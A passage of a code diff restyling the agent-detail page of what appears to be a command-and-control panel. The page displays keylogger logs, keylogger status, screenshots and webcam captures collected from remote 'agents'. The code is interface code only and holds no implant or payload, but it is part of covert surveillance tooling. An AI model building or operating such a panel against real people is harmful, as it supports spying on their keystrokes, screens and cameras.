             const data = await response.json();
             const logsContainer = document.getElementById('keyloggerLogs');
-            console.log('fetchKeyloggerLogs: keyloggerStatus =', keyloggerStatus);
             if (data.status === 'success' && data.logs) {
                 if (data.logs.length === 0) {
-                    logsContainer.innerHTML = '<li class="list-group-item text-muted">No keylogger logs available</li>';
+                    logsContainer.innerHTML = '<li class="text-slate-500">No keylogger entries captured yet</li>';
                 } else {
                     logsContainer.innerHTML = '';
                     data.logs.forEach(log => {
                         const logItem = document.createElement('li');
-                        logItem.className = 'list-group-item';
+                        logItem.className = 'px-3 py-1.5 rounded bg-slate-900/90 border border-slate-800/80 text-slate-200 break-all';
                         logItem.textContent = `[${log.timestamp}] ${log.keys}`;
                         logsContainer.appendChild(logItem);
                     });
                 }
-            } else {
-                logsContainer.innerHTML = '<li class="list-group-item text-danger">Failed to load keylogger logs</li>';
             }
         } catch (error) {
             console.error('Error fetching keylogger logs:', error);
-            const logsContainer = document.getElementById('keyloggerLogs');
-            logsContainer.innerHTML = '<li class="list-group-item text-danger">Error loading keylogger logs</li>';
         }
     }
 
     fetchKeyloggerLogs();
     setInterval(fetchKeyloggerLogs, 10000);
 
-    // New websocket client for keylogger status updates
+    // Keylogger status WebSocket
     const socket = io("{{ request.url_root }}keylogger", { reconnection: false });
-
     socket.on('connect', () => {
-        console.log('Connected to keylogger websocket namespace');
-        // Join the room for this agent to receive targeted events
         socket.emit('join', 'agent_{{ agent.id }}');
     });
 
-    socket.on('agent_connected', (data) => {
-        console.log('Received agent_connected event:', data);
-        if (data.status === 'success') {
-            const statusBadge = document.getElementById('keyloggerStatusBadge');
-            statusBadge.textContent = 'Keylogger Status: Active';
-            statusBadge.className = 'badge bg-success';
+    function setKeyloggerBadge(state) {
+        const badge = document.getElementById('keyloggerStatusBadge');
+        if (!badge) return;
+        if (state === 'active') {
+            badge.textContent = 'Keylogger: Active';
+            badge.className = 'px-2.5 py-1 rounded-full text-xs font-mono bg-emerald-500/15 text-emerald-400 border border-emerald-500/30';
+        } else if (state === 'inactive') {
+            badge.textContent = 'Keylogger: Inactive';
+            badge.className = 'px-2.5 py-1 rounded-full text-xs font-mono bg-rose-500/15 text-rose-400 border border-rose-500/30';
+        } else {
+            badge.textContent = `Keylogger: ${state}`;
+            badge.className = 'px-2.5 py-1 rounded-full text-xs font-mono bg-slate-800 text-slate-300 border border-slate-700';
         }
+    }
+
+    socket.on('agent_connected', (data) => {
+        if (data.status === 'success') setKeyloggerBadge('active');
     });
 
     socket.on('keylogger_status', (data) => {
-        console.log('Received keylogger_status event:', data);
-        const statusBadge = document.getElementById('keyloggerStatusBadge');
-        console.log('Before update: keyloggerStatus =', keyloggerStatus, ', badge text =', statusBadge.textContent);
-        if (data.status === 'stopped') {
-            statusBadge.textContent = 'Keylogger Status: Inactive';
-            statusBadge.className = 'badge bg-danger';
-            keyloggerStatus = 'stopped';
-        } else if (data.status === 'started') {
-            statusBadge.textContent = 'Keylogger Status: Active';
-            statusBadge.className = 'badge bg-success';
-            keyloggerStatus = 'active';
-        } else {
-            statusBadge.textContent = `Keylogger Status: ${data.status}`;
-            statusBadge.className = 'badge bg-secondary';
-            keyloggerStatus = 'unknown';
-        }
-        console.log('After update: keyloggerStatus =', keyloggerStatus, ', badge text =', statusBadge.textContent);
+        if (data.status === 'stopped') setKeyloggerBadge('inactive');
+        else if (data.status === 'started') setKeyloggerBadge('active');
+        else setKeyloggerBadge(data.status);
     });
 
-    socket.on('disconnect', (reason) => {
-        console.log('Keylogger websocket disconnected:', reason);
-        const statusBadge = document.getElementById('keyloggerStatusBadge');
-        console.log('Disconnect event fired, updating badge to Inactive');
-        statusBadge.textContent = 'Keylogger Status: Inactive';
-        statusBadge.className = 'badge bg-danger';
-    });
+    socket.on('disconnect', () => setKeyloggerBadge('inactive'));
 
-    // Connect to main socket namespace for screenshot and webcam updates
+    // Main WebSocket for live task/screenshot/webcam updates
     const mainSocket = io("{{ request.url_root }}", { reconnection: true });
-
-    mainSocket.on('connect', () => {
-        console.log('Connected to main websocket namespace');
-    });
-
-    // Handle task completion events
     mainSocket.on('task_complete', (data) => {
-        console.log('Received task_complete event:', data);
         if (data.agent_id === '{{ agent.id }}') {
-            showToast('Task Completed', 'Task (' + data.task_type + ') completed', 'success');
+            GlyconUI.toast('Task Completed', `Task (${data.task_type}) completed`, 'success');
             refreshAgentDetail();
         }
     });
 
-    // Handle new screenshot events - add new screenshot to the top of the list
     mainSocket.on('new_screenshot', (data) => {
-        console.log('Received new_screenshot event:', data);
         if (data.agent_id === '{{ agent.id }}') {
-            const screenshotsContainer = document.getElementById('screenshots-container');
-            const screenshotsSection = document.getElementById('screenshots-section');
-            
-            if (screenshotsContainer) {
-                // Remove "No screenshots available" message if present
-                const noScreenshotMsg = screenshotsSection.querySelector('.text-muted');
-                if (noScreenshotMsg && noScreenshotMsg.textContent.includes('No screenshots')) {
-                    noScreenshotMsg.remove();
-                }
-                
-                // Create new screenshot element
-                const newScreenshotHtml = `
-                    <div class="col-md-6 mb-3">
-                        <a href="{{ base_url }}/api/screenshots/${data.screenshot_id}" data-lightbox="screenshots-{{ agent.id }}">
-                            <img src="{{ base_url }}/api/screenshots/${data.screenshot_id}" class="img-fluid rounded" alt="Screenshot">
-                        </a>
-                        <p class="small text-muted mt-1">${data.timestamp}</p>
-                    </div>
-                `;
-                
-                // Insert at the beginning
-                screenshotsContainer.insertAdjacentHTML('afterbegin', newScreenshotHtml);
-                
-                // Reinitialize lightbox for new image
-                if (typeof lightbox !== 'undefined') {
-                    lightbox.init();
-                }
-                
-                // Show notification
-                showNotification('New screenshot received', 'info');
-            }
+            GlyconUI.toast('New Screenshot', 'Screenshot captured from agent', 'info');
+            refreshAgentDetail();
         }
     });
 
-    // Handle new webcam capture events - add new capture to the top of the list
     mainSocket.on('new_webcam', (data) => {
-        console.log('Received new_webcam event:', data);
-        const currentAgentId = '{{ agent.id }}';
-        console.log('Current agent ID:', currentAgentId, 'Event agent_id:', data.agent_id);
-        
-        // Check if the event is for this agent (compare both string and number)
-        if (String(data.agent_id) === String(currentAgentId) || data.agent_id === currentAgentId) {
-            console.log('Processing webcam capture for this agent');
-            const webcamContainer = document.getElementById('webcam-container');
-            const webcamSection = document.getElementById('webcam-section');
-            
-            if (webcamContainer) {
-                // Remove "No webcam captures available" message if present
-                const noWebcamMsg = webcamSection.querySelector('.text-muted');
-                if (noWebcamMsg && noWebcamMsg.textContent.includes('No webcam')) {
-                    noWebcamMsg.remove();
-                }
-                
-                // Create new webcam capture element
-                const newWebcamHtml = `
-                    <div class="col-md-6 mb-3">
-                        <a href="{{ base_url }}/api/webcam_captures/${data.capture_id}" data-lightbox="webcam-{{ agent.id }}">
-                            <img src="{{ base_url }}/api/webcam_captures/${data.capture_id}" class="img-fluid rounded" alt="Webcam Capture">
-                        </a>
-                        <p class="small text-muted mt-1">${data.timestamp}</p>
-                    </div>
-                `;
-                
-                // Insert at the beginning
-                webcamContainer.insertAdjacentHTML('afterbegin', newWebcamHtml);
-                
-                // Reinitialize lightbox for new image
-                if (typeof lightbox !== 'undefined') {
-                    lightbox.init();
-                }
-                
-                // Show notification
-                showNotification('New webcam capture received', 'info');
-                
-                console.log('Webcam capture added to UI successfully');
-            } else {
-                console.log('Webcam container not found, triggering page refresh');
-                // If container not found, refresh the page
-                refreshAgentDetail();
-            }
-        } else {
-            console.log('Webcam event is for a different agent:', data.agent_id, 'vs current:', currentAgentId);
+        if (String(data.agent_id) === '{{ agent.id }}') {
+            GlyconUI.toast('New Webcam Capture', 'Webcam frame captured from agent', 'info');
+            refreshAgentDetail();
         }
     });
-
-    // Helper function to show notifications
-    function showNotification(message, type) {
-        const alert = document.createElement('div');
-        alert.className = `alert alert-${type} fixed-top mx-auto mt-3`;
-        alert.style.width = '300px';
-        alert.style.zIndex = '1000';
-        alert.textContent = message;
-        document.body.appendChild(alert);
-        setTimeout(() => alert.remove(), 3000);
-    }
-
-    // Toast notification system
-    function showToast(title, message, type) {
-        let toastContainer = document.getElementById('toastContainer');
-        if (!toastContainer) {
-            toastContainer = document.createElement('div');
-            toastContainer.id = 'toastContainer';
-            toastContainer.className = 'position-fixed bottom-0 end-0 p-3';
-            toastContainer.style.zIndex = '11';
-            document.body.appendChild(toastContainer);
-        }
-        
-        const toastEl = document.createElement('div');
-        toastEl.className = 'toast align-items-center text-white bg-' + type + ' border-0';
-        toastEl.setAttribute('role', 'alert');
-        toastEl.setAttribute('aria-live', 'assertive');
-        toastEl.setAttribute('aria-atomic', 'true');
-        
-        toastEl.innerHTML = '<div class="d-flex"><div class="toast-body"><strong>' + title + '</strong><br>' + message + '</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button></div>';
-        
-        toastContainer.appendChild(toastEl);
-        const toast = new bootstrap.Toast(toastEl);
-        toast.show();
-        
-        setTimeout(() => toastEl.remove(), 5000);
-    }
-
 });
 </script>
 {% endblock %}
